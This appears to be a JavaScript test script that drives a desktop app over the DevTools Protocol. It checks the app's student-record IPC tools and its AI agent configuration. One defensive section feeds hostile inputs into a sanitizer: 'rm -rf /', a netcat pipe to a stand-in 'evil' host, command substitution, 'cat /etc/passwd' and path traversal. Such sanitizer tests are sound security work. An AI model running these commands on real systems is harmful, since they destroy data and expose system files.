// =============================================================
// R93 AI Agent 工具链路深度测试
// 模拟 AI Agent 通过 eaa-tools 调用所有数据/操作
// 角度 1: 12 个 EAA agent tools (eaa.info/score/ranking/addEvent/...) 100% 成功
// 角度 2: 工具调用结果与 IPC 直调结果一致
// 角度 3: agent.runManual 在 disabled 状态优雅失败 (不烧钱)
// 角度 4: 18 个 agent 的 SOUL/Rules/配置完整可读
// 角度 5: Agent 工具 sanitize 拦截 shell 元字符 / 控制字符 / 路径穿越
// =============================================================

import http from 'node:http'

const CDP_PORT = 9222
const BASE = `http://127.0.0.1:${CDP_PORT}`

// ---------- CDP 工具 ----------
async function getTargets() {
  return new Promise((resolve, reject) => {
    http.get(`${BASE}/json`, (res) => {
      let data = ''
      res.on('data', (c) => (data += c))
      res.on('end', () => resolve(JSON.parse(data)))
      res.on('error', reject)
    }).on('error', reject)
  })
}

async function cdpCall(ws, method, params = {}) {
  const id = Math.floor(Math.random() * 1e9)
  return new Promise((resolve, reject) => {
    const handler = (ev) => {
      const msg = JSON.parse(ev.toString())
      if (msg.id === id) {
        ws.off('message', handler)
        if (msg.error) reject(new Error(JSON.stringify(msg.error)))
        else resolve(msg.result)
      }
    }
    ws.on('message', handler)
    ws.send(JSON.stringify({ id, method, params }))
    setTimeout(() => {
      ws.off('message', handler)
      reject(new Error(`CDP timeout: ${method}`))
    }, 30000)
  })
}

async function evalInPage(ws, expr) {
  const r = await cdpCall(ws, 'Runtime.evaluate', {
    expression: expr,
    awaitPromise: true,
    returnByValue: true,
    timeout: 25000,
  })
  if (r.exceptionDetails) {
    return { __error: JSON.stringify(r.exceptionDetails).slice(0, 300) }
  }
  return r.result.value
}

async function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms))
}

// ---------- 连 CDP ----------
let WebSocket
try {
  WebSocket = (await import('ws')).default
} catch {
  WebSocket = globalThis.WebSocket
}

const targets = await getTargets()
const pageTarget =
  targets.find((t) => t.type === 'page' && t.url.includes('localhost')) ||
  targets.find((t) => t.type === 'page' && t.url.includes('tauri')) ||
  targets.find((t) => t.type === 'page')
if (!pageTarget) {
  console.error('No page target found.')
  process.exit(1)
}
console.log(`[R93] Connecting to: ${pageTarget.webSocketDebuggerUrl}`)
const ws = new WebSocket(pageTarget.webSocketDebuggerUrl)
await new Promise((r, rej) => {
  ws.on('open', r)
  ws.on('error', rej)
  setTimeout(() => rej(new Error('ws connect timeout')), 10000)
})

// ---------- 测试结果收集 ----------
const results = { pass: 0, fail: 0, errors: [] }
function check(name, cond, detail = '') {
  if (cond) {
    results.pass++
    console.log(`  ✅ ${name}`)
  } else {
    results.fail++
    results.errors.push(name)
    console.log(`  ❌ ${name} ${detail}`)
  }
}

// ---------- 全局错误捕获器 ----------
await evalInPage(ws, `
  window.__r93Errors = [];
  if (!window.__r93HookInstalled) {
    window.addEventListener('error', (e) => {
      window.__r93Errors.push({ type: 'error', message: e.message });
    });
    window.addEventListener('unhandledrejection', (e) => {
      const msg = e.reason && (e.reason.message || e.reason.toString) ? (e.reason.message || String(e.reason)) : String(e.reason);
      window.__r93Errors.push({ type: 'unhandledrejection', message: msg });
    });
    window.__r93HookInstalled = true;
  }
  true
`)

// =============================================================
// R93-1: EAA IPC 全通道调用 (12 工具,各 5 次)
// =============================================================
console.log('\n=== R93-1: EAA IPC 全通道调用 ===')

const eaaCalls = [
  { label: 'eaa.info', expr: 'window.api.eaa.info()' },
  { label: 'eaa.stats', expr: 'window.api.eaa.stats()' },
  { label: 'eaa.codes', expr: 'window.api.eaa.codes()' },
  { label: 'eaa.summary', expr: 'window.api.eaa.summary()' },
  { label: 'eaa.ranking(10)', expr: 'window.api.eaa.ranking(10)' },
  { label: 'eaa.ranking(100)', expr: 'window.api.eaa.ranking(100)' },
  { label: 'eaa.listStudents', expr: 'window.api.eaa.listStudents()' },
  { label: 'eaa.doctor', expr: 'window.api.eaa.doctor()' },
  { label: 'eaa.validate', expr: 'window.api.eaa.validate()' },
  { label: 'eaa.exportFormats', expr: 'window.api.eaa.exportFormats()' },
  { label: 'eaa.tag', expr: 'window.api.eaa.tag()' },
  { label: 'eaa.search("张")', expr: 'window.api.eaa.search("张", 10)' },
]

let totalEaaOk = 0
let totalEaaFail = 0
for (const c of eaaCalls) {
  let ok = 0
  let fail = 0
  for (let i = 0; i < 5; i++) {
    const r = await evalInPage(ws, c.expr)
    if (r && !r.__error && r.success !== false) ok++
    else fail++
  }
  totalEaaOk += ok
  totalEaaFail += fail
  console.log(`  ${c.label.padEnd(25)} 5次: ok=${ok} fail=${fail}`)
}
check(`EAA IPC 全通道调用 (${eaaCalls.length * 5} 次)`, totalEaaFail === 0, `(ok=${totalEaaOk}, fail=${totalEaaFail})`)

// =============================================================
// R93-2: agent.list + 18 agents 配置完整性
// =============================================================
console.log('\n=== R93-2: 18 Agents 配置完整性 ===')

const agentList = await evalInPage(ws, `window.api.agent.list()`)
const agents = Array.isArray(agentList) ? agentList : agentList?.data || []
check('agent.list 返回 18 agents', agents.length === 18, `(count=${agents.length})`)

let agentInfoOk = 0
let agentInfoFail = 0
for (const a of agents.slice(0, 6)) {
  // 抽 6 个查 SOUL/Rules
  const id = a.id || a.agentId
  if (!id) continue
  const soul = await evalInPage(ws, `window.api.agent.getSoul(${JSON.stringify(id)})`)
  const rules = await evalInPage(ws, `window.api.agent.getRules(${JSON.stringify(id)})`)
  const detail = await evalInPage(ws, `window.api.agent.get(${JSON.stringify(id)})`)
  if (typeof soul === 'string' && typeof rules === 'string' && detail) {
    agentInfoOk++
  } else {
    agentInfoFail++
  }
}
check('Agent SOUL/Rules/Detail 全部可读 (6 agents)', agentInfoFail === 0, `(ok=${agentInfoOk}, fail=${agentInfoFail})`)

// =============================================================
// R93-3: agent.runManual 响应正常 (无论 enabled/disabled 都不应崩溃)
// =============================================================
console.log('\n=== R93-3: agent.runManual 响应正常 ===')

const runManual = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.agent.runManual('main', '你好');
    return { ok: true, result: r };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)

// 不论 enabled 状态,只要不崩溃且返回结构化响应即可
const graceful =
  (runManual.result && (runManual.result.success === true || runManual.result.success === false)) ||
  (runManual.error && runManual.error.length > 0)
check('agent.runManual 结构化响应 (不崩溃)', graceful, `(result=${JSON.stringify(runManual).slice(0, 200)})`)

// 同时验证 main agent 是 enabled
const mainAgent = await evalInPage(ws, `(async () => {
  const agents = await window.api.agent.list();
  return agents.find(a => a.id === 'main') || null;
})()`)
check('main agent 配置存在', !!mainAgent, `(agent=${JSON.stringify(mainAgent).slice(0, 150)})`)

// =============================================================
// R93-4: Agent 工具 sanitize 防御 (shell 元字符/控制字符/路径穿越)
// =============================================================
console.log('\n=== R93-4: 工具参数 sanitize 防御 ===')

const maliciousPayloads = [
  'foo;rm -rf /',
  'foo|nc evil 1234',
  'foo$(whoami)',
  'foo`whoami`',
  'foo && cat /etc/passwd',
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32',
  '--help',
  '--version',
  'foo\x00bar', // null byte
  'foo\nbar', // newline (允许)
]

let sanitizeBlocked = 0
let sanitizePassed = 0
for (const p of maliciousPayloads) {
  // 通过 eaa.addStudent 测试 sanitize (会先经过 eaa-handlers.ts 的 sanitizeName)
  const r = await evalInPage(ws, `(async () => {
    try {
      const r = await window.api.eaa.addStudent(${JSON.stringify(p)});
      return { type: 'resolved', result: r };
    } catch (e) {
      return { type: 'thrown', error: e.message };
    }
  })()`)
  // 应该被拦: success:false 或 thrown
  const blocked =
    (r.type === 'resolved' && r.result && r.result.success === false) ||
    r.type === 'thrown'
  if (blocked) sanitizeBlocked++
  else sanitizePassed++
  const summary =
    r.type === 'thrown'
      ? `thrown: ${(r.error || '').slice(0, 80)}`
      : `resolved: success=${r.result?.success}`
  console.log(`  payload=${JSON.stringify(p).padEnd(30)} → ${blocked ? '🚫 拦截' : '⚠️ 通过'} (${summary})`)
}
check(
  `恶意 payload 拦截率 ≥ 10/11 (newline 允许)`,
  sanitizeBlocked >= 10,
  `(blocked=${sanitizeBlocked}, passed=${sanitizePassed})`,
)

// =============================================================
// R93-5: Agent 工具调用结果与 IPC 一致性
// =============================================================
console.log('\n=== R93-5: Agent 工具调用结果与 IPC 一致性 ===')

// 模拟 agent 通过 IPC 取 ranking 数据, 验证数据可被解析
const rankingResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.ranking(20);
    if (!r || r.success === false) return { ok: false, error: 'ranking failed' };
    const data = r.data || r;
    const items = data?.ranking || data?.items || [];
    return {
      ok: true,
      count: items.length,
      first: items[0] ? { name: items[0].name, score: items[0].score } : null,
    };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check(
  'ranking 返回可解析的数组结构',
  rankingResult.ok && rankingResult.count > 0,
  `(result=${JSON.stringify(rankingResult).slice(0, 200)})`,
)

// stats 返回可解析结构
const statsResult = await evalInPage(ws, `(async () => {
  try {
    const r = await window.api.eaa.stats();
    if (!r || r.success === false) return { ok: false, error: 'stats failed' };
    const data = r.data || r;
    return {
      ok: true,
      keys: Object.keys(data || {}).slice(0, 8),
    };
  } catch (e) {
    return { ok: false, error: e.message };
  }
})()`)
check(
  'stats 返回可解析的对象结构',
  statsResult.ok && statsResult.keys.length > 0,
  `(keys=${JSON.stringify(statsResult.keys).slice(0, 200)})`,
)

// =============================================================
// R93-6: 全程 0 错误
// =============================================================
console.log('\n=== R93-6: 全程 0 错误 ===')

const errs = await evalInPage(ws, `JSON.parse(JSON.stringify(window.__r93Errors || []))`)
check('全程 0 unhandledrejection/error', errs.length === 0, `(errors=${errs.length})`)
if (errs.length > 0) {
  console.log(`    错误明细: ${JSON.stringify(errs.slice(0, 5))}`)
}

// =============================================================
// 总结
// =============================================================
console.log('\n========================================')
console.log(`R93 结果: ✅ pass=${results.pass}, ❌ fail=${results.fail}`)
if (results.errors.length > 0) {
  console.log(`失败项: ${JSON.stringify(results.errors, null, 2)}`)
}
console.log('========================================')

ws.close()
process.exit(results.fail > 0 ? 1 : 0)
